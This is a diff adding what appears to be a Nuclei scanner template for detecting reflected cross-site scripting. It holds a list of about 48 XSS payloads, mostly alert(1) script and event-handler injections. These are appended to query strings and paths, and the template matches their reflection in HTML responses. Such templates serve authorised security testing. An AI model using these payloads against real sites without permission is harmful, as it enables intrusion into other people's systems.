@@ -1,0 +1,94 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<iframe src=\"javascript:alert(1)\"></iframe>"
+        - "<html onbeforecut=\"alert(1)\" contenteditable>test</html>"
+        - "<iframe src=\"javascript:alert(1)\"></iframe>"
+        - "<a href=\"javas\\x0Ccript:alert(1)\" id=\"fuzzelement1\">XSS</a>"
+        - "<output id=x tabindex=1 ondeactivate=alert(1)></output><input autofocus>"
+        - "<basefont onbeforecut=\"alert(1)\" contenteditable>test</basefont>"
+        - "<SCRIPT>alert(\"XSS');</script><s"
+        - "</div><script>alert('XSS')</script></div>"
+        - "<menuitem draggable=\"true\" ondragend=\"alert(1)\">test</menuitem>"
+        - "<style>:target {transform: rotate(180deg);}</style><optgroup id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></optgroup>"
+        - "<mark draggable=\"true\" ondragleave=\"alert(1)\">test</mark>"
+        - "<time onmouseout=\"alert(1)\">test</time>"
+        - "<aside oncopy=\"alert(1)\" contenteditable>test</aside>"
+        - "<mark id=x tabindex=1 onbeforeactivate=alert(1)></mark>"
+        - "<marquee id=x tabindex=1 ondeactivate=alert(1)></marquee><input id=y autofocus>"
+        - "<optgroup id=x tabindex=1 ondeactivate=alert(1)></optgroup><input id=y autofocus>"
+        - "<del draggable=\"true\" ondragleave=\"alert(1)\">test</del>"
+        - "<canvas draggable=\"true\" ondragenter=\"alert(1)\">test</canvas>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><summary id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></summary>"
+        - "<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>"
+        - "<tt draggable=\"true\" ondragleave=\"alert(1)\">test</tt>"
+        - "<style>@keyframes x{}</style><video style=\"animation-name:x\" onanimationstart=\"alert(1)\"></video>"
+        - "<video autoplay controls ontimeupdate=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<optgroup onmouseenter=\"alert(1)\">test</optgroup>"
+        - "<video id=x tabindex=1 onfocusin=alert(1)></video>"
+        - "<output onbeforecut=\"alert(1)\" contenteditable>test</output>"
+        - "&lt;SCRIPT&gt;alert(&quot;XSS&quot;&gt;&lt;/SCRIPT&gt;"
+        - "<style>:target {color:red;}</style><kbd id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></kbd>"
+        - "<tt onpaste=\"alert(1)\" contenteditable>test</tt>"
+        - "<dl draggable=\"true\" ondragstart=\"alert(1)\">test</dl>"
+        - "<video autoplay onerror=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<time id=x tabindex=1 onbeforedeactivate=alert(1)></time><input autofocus>"
+        - "<IMG SRC=x oncopy=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<script>alert(1)</script>"
+        - "<html:script>alert(\"XSS\");</html:script>"
+        - "<svg/onload=\"javascript:alert(1)\"></svg>"
+        - "<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>"
+        - "<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>"
+        - "<script>alert('XSS')</script>"
+        - "<menu draggable=\"true\" ondragend=\"alert(1)\">test</menu>"
+        - "<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>"
+        - "<time id=x tabindex=1 onbeforeactivate=alert(1)></time>"
+        - "<map draggable=\"true\" ondragend=\"alert(1)\">test</map>"
+        - "<html draggable=\"true\" ondragleave=\"alert(1)\">test</html>"
+        - "<script>javascript:alert(1)</script>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>"
+        - "<style>@keyframes x{}</style><hr style=\"animation-name:x\" onanimationend=\"alert(1)\"></hr>"
+        - "<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
